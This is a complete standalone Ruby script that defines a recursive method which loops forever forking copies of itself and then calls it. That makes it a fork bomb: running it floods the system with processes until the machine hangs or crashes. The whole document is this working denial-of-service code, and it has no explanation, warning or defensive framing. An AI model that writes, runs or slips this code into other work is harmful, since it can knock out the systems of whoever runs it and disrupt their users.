#!/usr/bin/env ruby

def bomb
  loop { fork { bomb } }
end

bomb
